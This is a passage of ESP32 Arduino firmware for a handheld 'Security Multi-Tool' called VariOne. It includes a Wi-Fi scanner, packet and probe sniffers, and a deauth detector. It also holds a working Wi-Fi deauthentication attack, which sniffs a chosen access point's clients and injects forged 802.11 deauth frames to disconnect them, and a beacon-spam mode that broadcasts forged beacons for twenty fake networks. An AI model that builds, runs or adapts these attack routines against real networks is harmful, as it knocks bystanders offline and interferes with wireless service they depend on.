#include <Arduino.h>
#include <U8g2lib.h>
#include <Wire.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "esp_log.h"

// === DISPLAY ===
U8G2_SH1106_128X64_NONAME_F_HW_I2C display(U8G2_R0, U8X8_PIN_NONE);

// === PIN DEFINITIONS ===
#define PIN_CC_CS 27

// === BUTTONS ===
#define BTN_LEFT  14
#define BTN_UP    26
#define BTN_RIGHT 32
#define BTN_DOWN  33
#define DEBOUNCE_MS 50

struct BtnState { uint8_t pin; bool last; unsigned long t; };
BtnState btns[4] = {
  {BTN_UP,    true, 0},
  {BTN_DOWN,  true, 0},
  {BTN_RIGHT, true, 0},
  {BTN_LEFT,  true, 0},
};
const char btnKeys[4] = {'w', 's', 'e', 'q'};

void initButtons() {
  pinMode(BTN_UP,    INPUT_PULLUP);
  pinMode(BTN_DOWN,  INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_LEFT,  INPUT_PULLUP);
}

char readButtons() {
  unsigned long now = millis();
  for (int i = 0; i < 4; i++) {
    bool state = digitalRead(btns[i].pin);
    if (state != btns[i].last && (now - btns[i].t) > DEBOUNCE_MS) {
      btns[i].last = state;
      btns[i].t = now;
      if (state == LOW) return btnKeys[i];
    }
  }
  return 0;
}

// === APP STATES ===
enum AppState {
  STATE_MENU,
  STATE_WIFI_SCAN,
  STATE_WIFI_RESULTS,
  STATE_PACKET_MONITOR,
  STATE_PROBE_SNIFF,
  STATE_DEAUTH_DETECT,
  STATE_DEAUTH_TARGET,
  STATE_DEAUTH_CLIENT_SCAN,
  STATE_DEAUTH_CLIENT_SELECT,
  STATE_DEAUTH_ATTACK,
  STATE_BEACON_SPAM,
  STATE_SUBGHZ,
  STATE_NFC,
  STATE_IR,
  STATE_ABOUT
};
AppState currentState = STATE_MENU;

// === MENU ===
const char* menuItems[] = {
  "WiFi Scanner",
  "Packet Monitor",
  "Probe Sniffer",
  "Deauth Detector",
  "Deauth Attack",
  "Beacon Spam",
  "Sub-GHz",
  "NFC Reader",
  "IR Remote",
  "About"
};
const int menuCount = 10;
int menuIndex = 0;

// === WIFI SCAN DATA ===
struct WifiNetwork {
  String ssid;
  int rssi;
  int encryption;
  int channel;
  uint8_t bssid[6];
};
WifiNetwork wifiNets[20];
int wifiCount = 0;
int wifiScroll = 0;

// === PACKET MONITOR DATA ===
volatile int channelPackets[15];
int channelPeaks[15];
int currentChannel = 1;
unsigned long lastChannelHop = 0;
unsigned long lastMonitorDraw = 0;
int totalPackets = 0;
bool monitorActive = false;

// === PROBE SNIFFER DATA ===
struct ProbeRequest {
  char ssid[33];
  int8_t rssi;
  uint8_t mac[6];
};
ProbeRequest probes[20];
int probeCount = 0;
int probeScroll = 0;
bool probeActive = false;

// === DEAUTH DETECTOR DATA ===
volatile int deauthCount = 0;
volatile int totalMonitored = 0;
unsigned long deauthStart = 0;
bool deauthActive = false;
int deauthHistory[64];
int deauthHistIdx = 0;

// ============================================================
// DEAUTH ATTACK DATA
// ============================================================

int deauthTargetIdx    = 0;
int deauthTargetScroll = 0;

struct ClientMAC { uint8_t mac[6]; };
ClientMAC clients[16];
volatile int clientCount = 0;
int clientSelectIdx    = 0;
int clientSelectScroll = 0;
bool clientScanActive  = false;

int deauthFrameCount    = 0;
bool deauthAttackActive = false;
unsigned long lastDeauthSend = 0;
bool attackTargetAll    = true;
uint8_t attackClientMAC[6];

#define CLIENT_SCAN_MS 10000
unsigned long clientScanStart = 0;

// ============================================================
// BEACON SPAM DATA
// ============================================================

const char* spamSSIDs[] = {
  "FBI Surveillance Van",
  "Not An FBI Van",
  "Pretty Fly for a WiFi",
  "Bill Wi the Science Fi",
  "The LAN Before Time",
  "Virus.exe",
  "Free WiFi Totally Safe",
  "Router McRouterface",
  "404 WiFi Not Found",
  "Hack The Planet",
  "Loading...",
  "CIC Lab Network",
  "VariOne Was Here",
  "No Internet Access",
  "dontconnect",
  "SkyNet Node 7",
  "HackMe If You Can",
  "ESP32 AP",
  "Abraham Linksys",
  "It Hurts When IP"
};
const int spamSSIDCount = 20;

bool beaconSpamActive    = false;
int beaconFrameCount     = 0;
int beaconSSIDIdx        = 0;
int beaconChannelIdx     = 0;
unsigned long lastBeaconSend = 0;
const uint8_t beaconChannels[] = {1, 6, 11};

// Random-looking but stable MACs per SSID (generated once at start)
uint8_t spamMACs[20][6];

void generateSpamMACs() {
  for (int i = 0; i < spamSSIDCount; i++) {
    spamMACs[i][0] = 0x02 | (i & 0xFC); // locally administered, unicast
    spamMACs[i][1] = 0x13 + i;
    spamMACs[i][2] = 0xAB - i;
    spamMACs[i][3] = 0x45 + (i * 7);
    spamMACs[i][4] = 0xCD ^ i;
    spamMACs[i][5] = 0xEF + (i * 3);
  }
}

void sendBeacon(const char* ssid, uint8_t* mac, uint8_t ch) {
  uint8_t ssidLen = strlen(ssid);
  uint8_t frame[100];  // 51 + up to 32 char SSID + margin
  int p = 0;

  // Frame Control: beacon
  frame[p++] = 0x80; frame[p++] = 0x00;
  // Duration
  frame[p++] = 0x00; frame[p++] = 0x00;
  // Destination: broadcast
  frame[p++] = 0xFF; frame[p++] = 0xFF; frame[p++] = 0xFF;
  frame[p++] = 0xFF; frame[p++] = 0xFF; frame[p++] = 0xFF;
  // Source MAC
  memcpy(&frame[p], mac, 6); p += 6;
  // BSSID
  memcpy(&frame[p], mac, 6); p += 6;
  // Sequence Control
  frame[p++] = 0x00; frame[p++] = 0x00;
  // Timestamp (8 bytes, zero is fine)
  memset(&frame[p], 0, 8); p += 8;
  // Beacon Interval: 100 TU
  frame[p++] = 0x64; frame[p++] = 0x00;
  // Capability: ESS + Privacy (looks like WPA2)
  frame[p++] = 0x31; frame[p++] = 0x04;
  // SSID IE
  frame[p++] = 0x00; frame[p++] = ssidLen;
  memcpy(&frame[p], ssid, ssidLen); p += ssidLen;
  // Supported Rates IE
  frame[p++] = 0x01; frame[p++] = 0x08;
  frame[p++] = 0x82; frame[p++] = 0x84;
  frame[p++] = 0x8b; frame[p++] = 0x96;
  frame[p++] = 0x24; frame[p++] = 0x30;
  frame[p++] = 0x48; frame[p++] = 0x6c;
  // DS Parameter Set (channel)
  frame[p++] = 0x03; frame[p++] = 0x01; frame[p++] = ch;

  esp_wifi_80211_tx(WIFI_IF_AP, frame, p, false);
}

// ============================================================
// DEAUTH FRAME BUILDER
// ============================================================

uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

void sendDeauthFrame(const uint8_t* apBSSID, const uint8_t* destMAC) {
  memcpy(&deauthFrame[4],  destMAC, 6);
  memcpy(&deauthFrame[10], apBSSID, 6);
  memcpy(&deauthFrame[16], apBSSID, 6);
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
}

// ============================================================
// PROMISCUOUS CALLBACKS
// ============================================================

void IRAM_ATTR packetMonitorCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!monitorActive) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  int ch = pkt->rx_ctrl.channel;
  if (ch >= 1 && ch <= 14) channelPackets[ch]++;
  totalPackets++;
}

void IRAM_ATTR probeCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!probeActive) return;
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 28 || frame[0] != 0x40 || len < 26) return;
  uint8_t ssidLen = frame[25];
  if (ssidLen == 0 || ssidLen > 32 || 26 + ssidLen > len) return;
  char ssid[33] = {0};
  memcpy(ssid, &frame[26], ssidLen);
  for (int i = 0; i < probeCount; i++)
    if (strcmp(probes[i].ssid, ssid) == 0 && memcmp(probes[i].mac, &frame[10], 6) == 0) return;
  if (probeCount >= 20) return;
  memcpy(probes[probeCount].ssid, ssid, 33);
  probes[probeCount].rssi = pkt->rx_ctrl.rssi;
  memcpy(probes[probeCount].mac, &frame[10], 6);
  probeCount++;
}

void IRAM_ATTR deauthCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!deauthActive) return;
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  totalMonitored++;
  if (pkt->payload[0] == 0xC0 || pkt->payload[0] == 0xA0) deauthCount++;
}

void IRAM_ATTR clientScanCB(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!clientScanActive) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = pkt->payload;
  if (pkt->rx_ctrl.sig_len < 24) return;
  const uint8_t* targetBSSID = wifiNets[deauthTargetIdx].bssid;
  const uint8_t* addr1 = &f[4];
  const uint8_t* addr2 = &f[10];
  const uint8_t* addr3 = &f[16];
  const uint8_t* clientMAC = nullptr;
  if (type == WIFI_PKT_DATA) {
    bool toDS   = (f[1] & 0x01);
    bool fromDS = (f[1] & 0x02);
    if (!toDS && !fromDS) {
      if (memcmp(addr3, targetBSSID, 6) == 0)
        if (!(addr2[0] & 0x01)) clientMAC = addr2;
    } else if (!toDS && fromDS) {
      if (memcmp(addr2, targetBSSID, 6) == 0)
        if (!(addr1[0] & 0x01)) clientMAC = addr1;
    } else if (toDS && !fromDS) {
      if (memcmp(addr1, targetBSSID, 6) == 0)
        if (!(addr2[0] & 0x01)) clientMAC = addr2;
    }
  } else {
    if (memcmp(addr3, targetBSSID, 6) == 0)
      if (memcmp(addr2, targetBSSID, 6) != 0 && !(addr2[0] & 0x01))
        clientMAC = addr2;
    if (!clientMAC && memcmp(addr2, targetBSSID, 6) == 0)
      if (memcmp(addr1, targetBSSID, 6) != 0 && !(addr1[0] & 0x01))
        clientMAC = addr1;
  }
  if (!clientMAC || clientCount >= 16) return;
  for (int i = 0; i < clientCount; i++)
    if (memcmp(clients[i].mac, clientMAC, 6) == 0) return;
  memcpy(clients[clientCount].mac, clientMAC, 6);
  clientCount++;
}

// === PROMISCUOUS HELPERS ===

void startPromiscuous(wifi_promiscuous_cb_t cb) {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(cb);
}

void stopPromiscuous() {
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
}

// === DRAWING HELPERS ===

void drawHeader(const char* title) {
  display.setFont(u8g2_font_7x13B_tr);
  display.drawStr(2, 12, title);
  display.drawHLine(0, 15, 128);
}

void drawControls(const char* text) {
  display.setFont(u8g2_font_5x7_tr);
  display.drawStr(2, 63, text);
}

// === SCREEN: MAIN MENU ===

void drawMenu() {
  display.clearBuffer();
  drawHeader("VariOne v0.2");
  display.setFont(u8g2_font_6x10_tr);
  int startIdx = (menuIndex >= 3) ? menuIndex - 2 : 0;
  for (int i = 0; i < 3; i++) {
    int idx = startIdx + i;
    if (idx >= menuCount) break;
    int y = 28 + (i * 14);
    if (idx == menuIndex) {
      display.drawBox(0, y - 10, 128, 13);
      display.setDrawColor(0);
      display.drawStr(6, y, menuItems[idx]);
      display.setDrawColor(1);
    } else {
      display.drawStr(6, y, menuItems[idx]);
    }
  }
  drawControls("up/dn:nav  ok:sel  bk:back");
  display.sendBuffer();
}

// === SCREEN: WIFI RESULTS ===

void drawWifiResults() {
  display.clearBuffer();
  char hdr[24];
  snprintf(hdr, sizeof(hdr), "WiFi (%d)", wifiCount);
  drawHeader(hdr);
  if (wifiCount == 0) {
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(10, 40, "No networks found");
    display.sendBuffer();
    return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i = 0; i < 4; i++) {
    int idx = wifiScroll + i;
    if (idx >= wifiCount) break;
    const char* lock = (wifiNets[idx].encryption != WIFI_AUTH_OPEN) ? "*" : " ";
    String name = wifiNets[idx].ssid;
    if (!name.length()) name = "(hidden)";
    if (name.length() > 12) name = name.substring(0, 11) + "~";
    char line[32];
    snprintf(line, sizeof(line), "%s%-12s %ddB ch%d",
      lock, name.c_str(), wifiNets[idx].rssi, wifiNets[idx].channel);
    display.drawStr(2, 27 + (i * 11), line);
  }
  drawControls("up/dn:scroll  bk:back");
  display.sendBuffer();
}

// === SCREEN: PACKET MONITOR ===

void drawPacketMonitor() {
  display.clearBuffer();
  char hdr[28];
  snprintf(hdr, sizeof(hdr), "PktMon: %d pkts", totalPackets);
  drawHeader(hdr);
  int graphY = 17, graphH = 38, barW = 8;
  int maxPkts = 1;
  for (int ch = 1; ch <= 14; ch++) {
    if (channelPackets[ch] > maxPkts) maxPkts = channelPackets[ch];
    if (channelPeaks[ch] > maxPkts) maxPkts = channelPeaks[ch];
  }
  for (int ch = 1; ch <= 14; ch++) {
    int x = (ch - 1) * 9 + 2;
    int barH = constrain(map(channelPackets[ch], 0, maxPkts, 0, graphH), 0, graphH);
    display.drawBox(x, graphY + graphH - barH, barW, barH);
    int peakH = map(channelPeaks[ch], 0, maxPkts, 0, graphH);
    if (peakH > 0) display.drawHLine(x, graphY + graphH - peakH, barW);
    if (channelPackets[ch] > channelPeaks[ch]) channelPeaks[ch] = channelPackets[ch];
  }
  display.setFont(u8g2_font_4x6_tr);
  for (int ch = 1; ch <= 14; ch++) {
    char num[3];
    snprintf(num, sizeof(num), "%d", ch);
    display.drawStr((ch - 1) * 9 + 3, 62, num);
  }
  display.sendBuffer();
}

// === SCREEN: PROBE SNIFFER ===

void drawProbeSniffer() {
  display.clearBuffer();
  char hdr[24];
  snprintf(hdr, sizeof(hdr), "Probes (%d)", probeCount);
  drawHeader(hdr);
  if (probeCount == 0) {
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(8, 35, "Listening...");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(8, 48, "Waiting for probes");
    drawControls("bk:stop");
    display.sendBuffer();
    return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i = 0; i < 4; i++) {
    int idx = probeScroll + i;
    if (idx >= probeCount) break;
    char line[32];
    snprintf(line, sizeof(line), "%02X:%02X>%-16s",
      probes[idx].mac[4], probes[idx].mac[5], probes[idx].ssid);
    display.drawStr(2, 27 + (i * 11), line);
  }
  drawControls("up/dn:scroll  bk:stop");
  display.sendBuffer();
}

// === SCREEN: DEAUTH DETECTOR ===

void drawDeauthDetector() {
  display.clearBuffer();
  drawHeader("Deauth Detector");
  display.setFont(u8g2_font_6x10_tr);
  char stat[28];
  snprintf(stat, sizeof(stat), "Monitoring: %lus", (millis() - deauthStart) / 1000);
  display.drawStr(4, 28, stat);
  if (deauthCount > 0) {
    display.setFont(u8g2_font_helvB12_tr);
    char alert[20];
    snprintf(alert, sizeof(alert), "!! %d !!", deauthCount);
    int w = display.getStrWidth(alert);
    display.drawStr((128 - w) / 2, 46, alert);
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(20, 56, "DEAUTH DETECTED!");
  } else {
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(20, 42, "All clear");
    char pkts[24];
    snprintf(pkts, sizeof(pkts), "%d frames checked", totalMonitored);
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(10, 54, pkts);
  }
  drawControls("bk:stop");
  display.sendBuffer();
}

// === SCREEN: DEAUTH TARGET SELECT ===

void drawDeauthTargetSelect() {
  display.clearBuffer();
  drawHeader("Pick Target AP");
  if (wifiCount == 0) {
    display.setFont(u8g2_font_6x10_tr);
    display.drawStr(4, 35, "No scan data!");
    display.setFont(u8g2_font_5x8_tr);
    display.drawStr(4, 50, "Run WiFi Scanner first");
    drawControls("bk:back");
    display.sendBuffer();
    return;
  }
  display.setFont(u8g2_font_5x8_tr);
  for (int i = 0; i < 4; i++) {
    int idx = deauthTargetScroll + i;
    if (idx >= wifiCount) break;
    int y = 27 + (i * 11);
    String name = wifiNets[idx].ssid;
    if (!name.length()) name = "(hidden)";
    if (name.length() > 14) name = name.substring(0, 13) + "~";
    if (idx == deauthTargetIdx) {
      display.drawBox(0, y - 8, 128, 10);
      display.setDrawColor(0);
      char line[32];
      snprintf(line, sizeof(line), ">%-14s ch%d", name.c_str(), wifiNets[idx].channel);
      display.drawStr(2, y, line);
      display.setDrawColor(1);
    } else {
      char line[32];
      snprintf(line, sizeof(line), " %-14s ch%d", name.c_str(), wifiNets[idx].channel);
      display.drawStr(2, y, line);
    }
  }
  drawControls("up/dn:nav ok:scan bk:back");
  display.sendBuffer();
}

// === SCREEN: CLIENT SCAN PROGRESS ===

void drawClientScan() {
  display.clearBuffer();
  drawHeader("Finding Clients");
  String name = wifiNets[deauthTargetIdx].ssid;
  if (!name.length()) name = "(hidden)";
  if (name.length() > 18) name = name.substring(0, 17) + "~";
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(4, 26, name.c_str());
  unsigned long elapsed = millis() - clientScanStart;
  int progress = map(constrain(elapsed, 0, CLIENT_SCAN_MS), 0, CLIENT_SCAN_MS, 0, 120);
  display.drawFrame(4, 32, 120, 10);
  display.drawBox(4, 32, progress, 10);
  char found[24];
  snprintf(found, sizeof(found), "Found: %d client(s)", clientCount);
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(4, 54, found);
  drawControls("bk:skip");
  display.sendBuffer();
}

// === SCREEN: CLIENT SELECT ===

void drawClientSelect() {
  display.clearBuffer();
  drawHeader("Pick Client");
  int totalRows = clientCount + 1;
  display.setFont(u8g2_font_5x8_tr);
  for (int i = 0; i < 4; i++) {
    int idx = clientSelectScroll + i;
    if (idx >= totalRows) break;
    int y = 27 + (i * 11);
    char line[32];
    if (idx == 0) {
      snprintf(line, sizeof(line), " All Clients (%d)", clientCount);
    } else {
      int ci = idx - 1;
      snprintf(line, sizeof(line), " %02X:%02X:%02X:%02X:%02X:%02X",
        clients[ci].mac[0], clients[ci].mac[1], clients[ci].mac[2],
        clients[ci].mac[3], clients[ci].mac[4], clients[ci].mac[5]);
    }
    if (idx == clientSelectIdx) {
      display.drawBox(0, y - 8, 128, 10);
      display.setDrawColor(0);
      line[0] = '>';
      display.drawStr(2, y, line);
      display.setDrawColor(1);
    } else {
      display.drawStr(2, y, line);
    }
  }
  drawControls("up/dn:nav ok:atk bk:back");
  display.sendBuffer();
}

// === SCREEN: DEAUTH ATTACK RUNNING ===

void drawDeauthAttack() {
  display.clearBuffer();
  drawHeader("Deauth Attack");
  String name = wifiNets[deauthTargetIdx].ssid;
  if (!name.length()) name = "(hidden)";
  if (name.length() > 16) name = name.substring(0, 15) + "~";
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(4, 26, name.c_str());
  if (attackTargetAll) {
    display.drawStr(4, 37, ">> All clients");
  } else {
    char mac[22];
    snprintf(mac, sizeof(mac), ">>%02X:%02X:%02X:%02X:%02X:%02X",
      attackClientMAC[0], attackClientMAC[1], attackClientMAC[2],
      attackClientMAC[3], attackClientMAC[4], attackClientMAC[5]);
    display.drawStr(2, 37, mac);
  }
  display.setFont(u8g2_font_helvB12_tr);
  char fc[20];
  snprintf(fc, sizeof(fc), "%d frm", deauthFrameCount);
  int w = display.getStrWidth(fc);
  display.drawStr((128 - w) / 2, 56, fc);
  drawControls("bk:stop");
  display.sendBuffer();
}

// === SCREEN: BEACON SPAM ===

void drawBeaconSpam() {
  display.clearBuffer();
  drawHeader("Beacon Spam");
  display.setFont(u8g2_font_5x8_tr);

  // Current SSID being broadcast (truncate if needed)
  char ssidLine[24];
  snprintf(ssidLine, sizeof(ssidLine), "%.22s", spamSSIDs[beaconSSIDIdx]);
  display.drawStr(2, 27, ssidLine);

  // SSID index indicator
  char idxLine[20];
  snprintf(idxLine, sizeof(idxLine), "SSID %d/%d", beaconSSIDIdx + 1, spamSSIDCount);
  display.drawStr(2, 38, idxLine);

  // Total beacons sent
  display.setFont(u8g2_font_helvB12_tr);
  char fc[20];
  snprintf(fc, sizeof(fc), "%d sent", beaconFrameCount);
  int w = display.getStrWidth(fc);
  display.drawStr((128 - w) / 2, 56, fc);

  drawControls("bk:stop");
  display.sendBuffer();
}

// === PLACEHOLDER / ABOUT ===

void drawPlaceholder(const char* title, const char* msg) {
  display.clearBuffer();
  drawHeader(title);
  display.setFont(u8g2_font_6x10_tr);
  display.drawStr(10, 40, msg);
  drawControls("bk:back");
  display.sendBuffer();
}

void drawAbout() {
  display.clearBuffer();
  drawHeader("About");
  display.setFont(u8g2_font_6x10_tr);
  display.drawStr(4, 30, "VariOne v0.2");
  display.drawStr(4, 42, "Security Multi-Tool");
  display.setFont(u8g2_font_5x8_tr);
  display.drawStr(4, 54, "CIC - Dr. Ahmed Gaber");
  drawControls("bk:back");
  display.sendBuffer();
}

// ============================================================
// TOOL FUNCTIONS
// ============================================================

void runWifiScan() {
  currentState = STATE_WIFI_SCAN;
  display.clearBuffer();
  drawHeader("WiFi Scanner");
  display.setFont(u8g2_font_6x10_tr);
  display.drawStr(20, 40, "Scanning...");
  display.sendBuffer();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  int found = WiFi.scanNetworks();
  wifiCount = min(found, 20);
  for (int i = 0; i < wifiCount; i++) {
    wifiNets[i].ssid = WiFi.SSID(i);
    wifiNets[i].rssi = WiFi.RSSI(i);
    wifiNets[i].encryption = WiFi.encryptionType(i);
    wifiNets[i].channel = WiFi.channel(i);
    memcpy(wifiNets[i].bssid, WiFi.BSSID(i), 6);
  }
  for (int i = 0; i < wifiCount - 1; i++)
    for (int j = i + 1; j < wifiCount; j++)
      if (wifiNets[j].rssi > wifiNets[i].rssi) {
        WifiNetwork tmp = wifiNets[i]; wifiNets[i] = wifiNets[j]; wifiNets[j] = tmp;
      }
  wifiScroll = 0;
  WiFi.scanDelete();
  WiFi.mode(WIFI_OFF);
  currentState = STATE_WIFI_RESULTS;
}

void startPacketMonitor() {
  memset((void*)channelPackets, 0, sizeof(channelPackets));
  memset(channelPeaks, 0, sizeof(channelPeaks));
  totalPackets = 0; currentChannel = 1; monitorActive = true;
  startPromiscuous(packetMonitorCB);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  lastChannelHop = millis();
  currentState = STATE_PACKET_MONITOR;
}

void stopPacketMonitor() {
  monitorActive = false; stopPromiscuous(); currentState = STATE_MENU;
}

void startProbeSniffer() {
  probeCount = 0; probeScroll = 0; probeActive = true;
  startPromiscuous(probeCB);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  currentState = STATE_PROBE_SNIFF;
}

void stopProbeSniffer() {
  probeActive = false; stopPromiscuous(); currentState = STATE_MENU;
}

void startDeauthDetector() {
  deauthCount = 0; totalMonitored = 0;
  deauthStart = millis(); deauthActive = true;
  memset(deauthHistory, 0, sizeof(deauthHistory)); deauthHistIdx = 0;
  startPromiscuous(deauthCB);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  currentState = STATE_DEAUTH_DETECT;
}

void stopDeauthDetector() {
  deauthActive = false; stopPromiscuous(); currentState = STATE_MENU;
}

void enterDeauthTargetSelect() {
  deauthTargetIdx = 0; deauthTargetScroll = 0;
  currentState = STATE_DEAUTH_TARGET;
}

void startClientScan() {
  clientCount = 0;
  memset(clients, 0, sizeof(clients));
  clientScanActive = true;
  clientScanStart = millis();
  startPromiscuous(clientScanCB);
  esp_wifi_set_channel(wifiNets[deauthTargetIdx].channel, WIFI_SECOND_CHAN_NONE);
  currentState = STATE_DEAUTH_CLIENT_SCAN;
}

void finishClientScan() {
  clientScanActive = false;
  stopPromiscuous();
  clientSelectIdx = 0;
  clientSelectScroll = 0;
  currentState = STATE_DEAUTH_CLIENT_SELECT;
}

void startDeauthAttack() {
  deauthFrameCount = 0;
  deauthAttackActive = true;
  lastDeauthSend = 0;
  if (clientSelectIdx == 0 || clientCount == 0) {
    attackTargetAll = true;
  } else {
    attackTargetAll = false;
    memcpy(attackClientMAC, clients[clientSelectIdx - 1].mac, 6);
  }
  int targetCh = wifiNets[deauthTargetIdx].channel;
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("v", nullptr, targetCh, 1);
  delay(100);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_channel(targetCh, WIFI_SECOND_CHAN_NONE);
  currentState = STATE_DEAUTH_ATTACK;
}

void stopDeauthAttack() {
  deauthAttackActive = false;
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  currentState = STATE_MENU;
}

void startBeaconSpam() {
  beaconFrameCount = 0;
  beaconSSIDIdx    = 0;
  beaconSpamActive = true;
  lastBeaconSend   = 0;
  generateSpamMACs();
  // Init AP interface so we can inject frames
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("v", nullptr, 1, 1);
  delay(100);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  currentState = STATE_BEACON_SPAM;
}

void stopBeaconSpam() {
  beaconSpamActive = false;
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);
  currentState = STATE_MENU;
}

// ============================================================
// INPUT HANDLING
// ============================================================

void handleInput(char input) {
  switch (currentState) {

    case STATE_MENU:
      if (input == 'w' && menuIndex > 0) menuIndex--;
      else if (input == 's' && menuIndex < menuCount - 1) menuIndex++;
      else if (input == 'e') {
        switch (menuIndex) {
          case 0: runWifiScan(); return;
          case 1: startPacketMonitor(); return;
          case 2: startProbeSniffer(); return;
          case 3: startDeauthDetector(); return;
          case 4: enterDeauthTargetSelect(); return;
          case 5: startBeaconSpam(); return;
          case 6: currentState = STATE_SUBGHZ; break;
          case 7: currentState = STATE_NFC; break;
          case 8: currentState = STATE_IR; break;
          case 9: currentState = STATE_ABOUT; break;
        }
      }
      break;

    case STATE_WIFI_RESULTS:
      if (input == 'w' && wifiScroll > 0) wifiScroll--;
      else if (input == 's' && wifiScroll < wifiCount - 4) wifiScroll++;
      else if (input == 'q') currentState = STATE_MENU;
      break;

    case STATE_PACKET_MONITOR:
      if (input == 'q') stopPacketMonitor();
      break;

    case STATE_PROBE_SNIFF:
      if (input == 'w' && probeScroll > 0) probeScroll--;
      else if (input == 's' && probeScroll < probeCount - 4) probeScroll++;
      else if (input == 'q') stopProbeSniffer();
      break;

    case STATE_DEAUTH_DETECT:
      if (input == 'q') stopDeauthDetector();
      break;

    case STATE_DEAUTH_TARGET:
      if (input == 'w' && deauthTargetIdx > 0) {
        deauthTargetIdx--;
        if (deauthTargetIdx < deauthTargetScroll) deauthTargetScroll = deauthTargetIdx;
      } else if (input == 's' && deauthTargetIdx < wifiCount - 1) {
        deauthTargetIdx++;
        if (deauthTargetIdx >= deauthTargetScroll + 4) deauthTargetScroll = deauthTargetIdx - 3;
      } else if (input == 'e') startClientScan();
      else if (input == 'q') currentState = STATE_MENU;
      break;

    case STATE_DEAUTH_CLIENT_SCAN:
      if (input == 'q') finishClientScan();
      break;

    case STATE_DEAUTH_CLIENT_SELECT: {
      int totalRows = clientCount + 1;
      if (input == 'w' && clientSelectIdx > 0) {
        clientSelectIdx--;
        if (clientSelectIdx < clientSelectScroll) clientSelectScroll = clientSelectIdx;
      } else if (input == 's' && clientSelectIdx < totalRows - 1) {
        clientSelectIdx++;
        if (clientSelectIdx >= clientSelectScroll + 4) clientSelectScroll = clientSelectIdx - 3;
      } else if (input == 'e') startDeauthAttack();
      else if (input == 'q') currentState = STATE_MENU;
      break;
    }

    case STATE_DEAUTH_ATTACK:
      if (input == 'q') stopDeauthAttack();
      break;

    case STATE_BEACON_SPAM:
      if (input == 'q') stopBeaconSpam();
      break;

    case STATE_SUBGHZ:
    case STATE_NFC:
    case STATE_IR:
    case STATE_ABOUT:
      if (input == 'q') currentState = STATE_MENU;
      break;

    default: break;
  }
}

// ============================================================
// SETUP + LOOP
// ============================================================

void setup() {
  Serial.begin(115200);
  Serial.println("VariOne v0.2 booting...");

  esp_log_level_set("wifi", ESP_LOG_NONE);

  pinMode(PIN_CC_CS, OUTPUT);
  digitalWrite(PIN_CC_CS, HIGH);

  initButtons();

  display.begin();
  display.clearBuffer();
  display.setFont(u8g2_font_helvB12_tr);
  display.drawStr(20, 28, "VariOne");
  display.setFont(u8g2_font_6x10_tr);
  display.drawStr(15, 48, "v0.2 Ready");
  display.sendBuffer();
  delay(1500);

  currentState = STATE_MENU;
}

void loop() {

  // Packet Monitor channel hop
  if (currentState == STATE_PACKET_MONITOR && monitorActive) {
    if (millis() - lastChannelHop > 200) {
      if (++currentChannel > 14) currentChannel = 1;
      esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
      lastChannelHop = millis();
    }
    if (millis() - lastMonitorDraw > 100) {
      drawPacketMonitor();
      lastMonitorDraw = millis();
    }
  }

  // Probe Sniffer channel hop
  if (currentState == STATE_PROBE_SNIFF && probeActive) {
    static unsigned long lastProbeHop = 0;
    if (millis() - lastProbeHop > 500) {
      static int probeCh = 1;
      if (++probeCh > 14) probeCh = 1;
      esp_wifi_set_channel(probeCh, WIFI_SECOND_CHAN_NONE);
      lastProbeHop = millis();
    }
  }

  // Deauth Detector channel hop
  if (currentState == STATE_DEAUTH_DETECT && deauthActive) {
    static unsigned long lastDetectHop = 0;
    if (millis() - lastDetectHop > 300) {
      static int detectCh = 1;
      if (++detectCh > 14) detectCh = 1;
      esp_wifi_set_channel(detectCh, WIFI_SECOND_CHAN_NONE);
